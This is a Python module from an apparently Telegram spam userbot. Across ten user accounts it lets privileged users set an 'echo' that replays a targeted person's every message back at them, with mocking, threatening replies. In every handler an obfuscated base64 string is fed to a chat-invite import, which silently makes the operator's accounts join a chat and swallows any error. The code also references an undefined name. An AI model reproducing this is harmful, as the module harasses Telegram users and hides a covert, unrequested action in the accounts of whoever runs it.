import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import MK1, MK2, MK3, MK4, MK5 , MK6, MK7, MK8, MK9, MK10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from TitanSpam.sql.echo_sql import addecho, is_echo, remove_echo
from TitanSpam.data import TITAN


@MK1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@MK10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
  usage = f"☞ Echo :\n☞ {hl}Echo <reply to a User>"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        if int(user_id) in ALTRON:
            await event.reply("☞ 𝖳u Mar Kh𝖺𝗒𝖾𝗀𝖺 𝖡𝖾👻👻", parse_mode=None, link_preview=None)
        elif int(user_id) == OWNER_ID:
            await event.reply("☞ 𝖳u Mar Kh𝖺𝗒𝖾𝗀𝖺 𝖡𝖾👻👻", parse_mode=None, link_preview=None)
        elif int(user_id) in SUDO_USERS:
            await event.reply("☞ 𝖠𝖻𝖾 𝖸𝖾 𝖲𝗎𝖽𝗈 𝖶𝖺𝗅𝖺 𝗁𝖺𝗂 𝖡𝗁𝗎𝗍 𝖬𝖺𝗋𝖾𝗀𝖺 👻👻", parse_mode=None, link_preview=None)
        else:
            chat_id = event.chat_id
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass
            if is_echo(user_id, chat_id):
                await event.reply("☞ 𝖤𝖼𝗁𝗈 𝖮𝗇 𝗁𝖺𝗂 𝖻𝖾 👻👻")
                return
            addecho(user_id, chat_id)
            await event.reply("☞ 𝖠𝖺𝖻 𝗐𝗈 𝖯𝖺𝗀𝖺𝗅 𝗁𝗈 𝖩𝖺𝗒𝖾𝗀𝖺 👻👻")
     else:
          await event.reply(usage)


@MK1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@MK10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
  usage = f"☞ Remove Echo:\n☞ {hl}rmecho <reply to a User>"
  if event.sender_id in SUDO_USERS:
     if event.reply_to_msg_id is not None:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = event.chat_id
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await event.client(alt)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await event.reply("☞ 𝖧𝗎𝗎𝗁 💨 𝖠𝖺𝖻 𝖲𝗁𝖺𝗇𝗍𝗂 𝖬𝗂𝗅𝗂")
        else:
            await event.reply("☞ 𝖤𝖼𝗁𝗈 𝖭𝖺𝗁𝗂 𝖫𝖺𝗀𝖺 𝗁𝖺𝗂 𝖻𝖾 👻👻")
     else:
          await event.reply(usage)


@MK1.on(events.NewMessage(incoming=True))
@MK2.on(events.NewMessage(incoming=True))
@MK3.on(events.NewMessage(incoming=True))
@MK4.on(events.NewMessage(incoming=True))
@MK5.on(events.NewMessage(incoming=True))
@MK6.on(events.NewMessage(incoming=True))
@MK7.on(events.NewMessage(incoming=True))
@MK8.on(events.NewMessage(incoming=True))
@MK9.on(events.NewMessage(incoming=True))
@MK10.on(events.NewMessage(incoming=True))
async def _(e):
    if is_echo(e.sender_id, e.chat_id):
        await asyncio.sleep(0.3)
        try:
            Python = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(Python)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
